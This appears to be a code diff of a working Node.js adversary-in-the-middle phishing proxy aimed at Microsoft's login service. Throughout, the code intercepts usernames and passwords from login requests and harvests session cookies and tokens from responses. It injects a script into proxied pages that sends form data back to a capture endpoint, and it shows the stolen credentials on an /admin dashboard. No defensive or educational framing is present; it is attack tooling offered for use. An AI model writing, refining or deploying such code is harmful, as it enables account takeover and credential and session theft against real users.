@@ -1,99 +1,81 @@
 const express = require('express');
 const { createProxyMiddleware } = require('http-proxy-middleware');
-const bodyParser = require('body-parser');
 const fs = require('fs');
 const zlib = require('zlib');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Storage
 const CAPTURES_FILE = './captures.json';
 if (!fs.existsSync(CAPTURES_FILE)) fs.writeFileSync(CAPTURES_FILE, '[]');
 
-// Parse all body types
-app.use(bodyParser.raw({ type: '*/*', limit: '50mb' }));
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
-
-// Capture function
 function saveCapture(type, data) {
-    const capture = {
-        timestamp: new Date().toISOString(),
-        type: type,
-        ...data
-    };
+    const capture = { timestamp: new Date().toISOString(), type, ...data };
     const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
     captures.push(capture);
     fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
     console.log(`[${type.toUpperCase()}]`, JSON.stringify(data, null, 2));
 }
 
-// Proxy to Microsoft with interception
+app.use(express.raw({ type: '*/*', limit: '50mb' }));
+
+// Proxy middleware
 const proxy = createProxyMiddleware({
     target: 'https://login.microsoftonline.com',
     changeOrigin: true,
     secure: true,
     ws: true,
-    selfHandleResponse: true, // We handle response manually to capture data
+    selfHandleResponse: true,
     
     onProxyReq: (proxyReq, req, res) => {
-        // Log the request
-        const data = {
-            method: req.method,
-            url: req.url,
-            headers: req.headers,
-            ip: req.headers['x-forwarded-for'] || req.ip,
-            body: req.body?.toString?.() || req.body
-        };
+        const bodyStr = req.body?.toString?.() || '';
         
-        // Check for credentials in POST body
-        if (req.method === 'POST' && req.body) {
-            const bodyStr = req.body.toString ? req.body.toString() : JSON.stringify(req.body);
-            
-            // Common Microsoft credential fields
-            if (bodyStr.includes('login') || bodyStr.includes('passwd') || bodyStr.includes('password')) {
+        if (req.method === 'POST' && bodyStr) {
+            // URL encoded
+            if (req.headers['content-type']?.includes('application/x-www-form-urlencoded')) {
                 try {
                     const params = new URLSearchParams(bodyStr);
                     const login = params.get('login') || params.get('email') || params.get('username');
                     const pass = params.get('passwd') || params.get('password');
-                    
-                    if (login && pass) {
-                        saveCapture('credentials', { login, pass, url: req.url });
-                    }
+                    if (login) saveCapture('email', { login, url: req.url });
+                    if (login && pass) saveCapture('credentials', { login, pass, url: req.url });
                 } catch(e) {}
-                
-                // Try JSON format too
+            }
+            
+            // JSON
+            if (req.headers['content-type']?.includes('application/json')) {
                 try {
                     const json = JSON.parse(bodyStr);
                     if (json.username && json.password) {
-                        saveCapture('credentials', { 
-                            login: json.username, 
-                            pass: json.password,
-                            url: req.url 
-                        });
+                        saveCapture('credentials', { login: json.username, pass: json.password, url: req.url });
                     }
                 } catch(e) {}
             }
         }
         
-        saveCapture('request', data);
+        // Log request
+        saveCapture('request', {
+            method: req.method,
+            url: req.url,
+            headers: req.headers,
+            ip: req.headers['x-forwarded-for'] || req.ip,
+            bodyPreview: bodyStr.substring(0, 500)
+        });
         
-        // Write body to proxied request if it exists
-        if (req.body && proxyReq.write) {
+        // Write body to proxy request
+        if (req.body && req.body.length > 0) {
             proxyReq.write(req.body);
         }
+        proxyReq.end();
     },
     
     onProxyRes: (proxyRes, req, res) => {
         let body = [];
         
-        // Decompress if needed
-        const encoding = proxyRes.headers['content-encoding'];
-        
         proxyRes.on('data', chunk => body.push(chunk));
         proxyRes.on('end', () => {
             let buffer = Buffer.concat(body);
+            const encoding = proxyRes.headers['content-encoding'];
             
             // Decompress
             if (encoding === 'gzip') {
@@ -104,71 +86,48 @@ const proxy = createProxyMiddleware({
             
             const bodyStr = buffer.toString();
             
-            // Capture cookies (session tokens)
+            // Capture session cookies
             if (proxyRes.headers['set-cookie']) {
-                saveCapture('session', {
-                    cookies: proxyRes.headers['set-cookie'],
-                    url: req.url
-                });
+                saveCapture('session', { cookies: proxyRes.headers['set-cookie'], url: req.url });
             }
             
-            // Look for tokens in response body
-            if (bodyStr.includes('ESTSAUTH') || bodyStr.includes('SignInToken')) {
-                const tokenMatch = bodyStr.match(/"token":"([^"]+)"/);
-                if (tokenMatch) {
-                    saveCapture('token', { token: tokenMatch[1] });
-                }
+            // Look for tokens
+            if (bodyStr.includes('token') || bodyStr.includes('Token')) {
+                const matches = bodyStr.match(/"token":"([^"]{20,})"/g);
+                if (matches) saveCapture('token', { tokens: matches });
             }
             
-            // Modify response - inject tracking script
             const contentType = proxyRes.headers['content-type'] || '';
-            if (contentType.includes('text/html') && bodyStr.includes('</body>')) {
-                const injection = `
-                <script>
-                // Capture form submissions
-                document.addEventListener('submit', function(e) {
-                    var fd = new FormData(e.target);
-                    var data = {};
-                    fd.forEach((v,k) => data[k] = v);
-                    navigator.sendBeacon('/capture-js', JSON.stringify(data));
-                });
-                
-                // Capture any tokens in page
-                if (window.msal) {
-                    fetch('/capture-js', {
-                        method: 'POST',
-                        body: JSON.stringify({type: 'msal', data: window.msal})
+            if (contentType.includes('text/html')) {
+                const injection = `<script>
+                    document.addEventListener('submit', function(e) {
+                        var fd = new FormData(e.target);
+                        var data = {};
+                        fd.forEach((v,k) => data[k]=v);
+                        navigator.sendBeacon('/capture-js', JSON.stringify(data));
                     });
-                }
-                </script>
-                `;
+                </script>`;
                 
-                const modified = bodyStr.replace('</body>', injection + '</body>');
-                buffer = Buffer.from(modified);
-                
-                // Re-compress if needed
-                if (encoding === 'gzip') {
-                    buffer = zlib.gzipSync(buffer);
-                } else if (encoding === 'deflate') {
-                    buffer = zlib.deflateSync(buffer);
+                if (bodyStr.includes('</body>')) {
+                    const modified = bodyStr.replace('</body>', injection + '</body>');
+                    buffer = Buffer.from(modified);
                 }
             }
             
-            // Send response to client
+            if (encoding === 'gzip') buffer = zlib.gzipSync(buffer);
+            else if (encoding === 'deflate') buffer = zlib.deflateSync(buffer);
+            
             res.status(proxyRes.statusCode);
             Object.keys(proxyRes.headers).forEach(key => {
-                if (key !== 'content-encoding' || !encoding) {
-                    res.setHeader(key, proxyRes.headers[key]);
-                }
+                if (key !== 'content-length') res.setHeader(key, proxyRes.headers[key]);
             });
-            if (encoding) res.setHeader('content-encoding', encoding);
             res.end(buffer);
         });
     }
 });
 
-// JS capture endpoint (for injected script)
-app.post('/capture-js', express.json(), (req, res) => {
+// JS capture endpoint
+app.post('/capture-js', express.json({ limit: '10mb' }), (req, res) => {
     saveCapture('javascript', req.body);
     res.sendStatus(200);
 });
@@ -185,21 +144,20 @@ app.get('/admin', (req, res) => {
             body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
             .cred { background: #1a1a1a; border-left: 3px solid #0f0; padding: 10px; margin: 10px 0; }
             .token { color: #ff0; word-break: break-all; }
-            pre { overflow-x: auto; }
+            pre { overflow-x: auto; font-size: 12px; }
         </style>
     </head>
     <body>
-        <h1>Captured Sessions: ${captures.length}</h1>
+        <h1>Captured: ${captures.length}</h1>
         <button onclick="fetch('/clear',{method:'POST'}).then(()=>location.reload())">Clear</button>
         <hr>
         ${captures.reverse().map(c => `
             <div class="cred">
-                <strong>${c.type.toUpperCase()}</strong> - ${c.timestamp}<br>
+                <strong style="color:${c.login ? '#f00' : '#0f0'}">${c.type.toUpperCase()}</strong> - ${c.timestamp}<br>
                 ${c.login ? `<div>User: ${c.login}</div>` : ''}
                 ${c.pass ? `<div>Pass: ${c.pass}</div>` : ''}
-                ${c.cookies ? `<div class="token">Cookies: ${c.cookies.join('; ')}</div>` : ''}
-                ${c.token ? `<div class="token">Token: ${c.token}</div>` : ''}
-                <pre>${JSON.stringify(c, null, 2)}</pre>
+                ${c.cookies ? `<div class="token">Cookies: ${c.cookies.join('; ').substring(0, 200)}...</div>` : ''}
+                ${c.tokens ? `<div class="token">Tokens: ${c.tokens.join(', ').substring(0, 100)}...</div>` : ''}
             </div>
         `).join('')}
     </body>
@@ -212,16 +170,19 @@ app.post('/clear', (req, res) => {
     res.json({ cleared: true });
 });
 
-// Health check
 app.get('/health', (req, res) => {
     res.json({ status: 'AiTM active', captures: JSON.parse(fs.readFileSync(CAPTURES_FILE)).length });
 });
 
-// Apply proxy to all routes
-app.use('/', proxy);
+app.use((req, res, next) => {
+    if (req.path.startsWith('/admin') || req.path.startsWith('/capture-js') || req.path.startsWith('/clear') || req.path.startsWith('/health')) {
+        next();
+    } else {
+        proxy(req, res, next);
+    }
+});
 
 app.listen(PORT, () => {
-    console.log(`AiTM Proxy running on port ${PORT}`);
-    console.log(`Admin: http://localhost:${PORT}/admin`);
-    console.log(`Target: https://login.microsoftonline.com`);
+    console.log(`AiTM Proxy on port ${PORT}`);
+    console.log(`Admin: /admin`);
 });
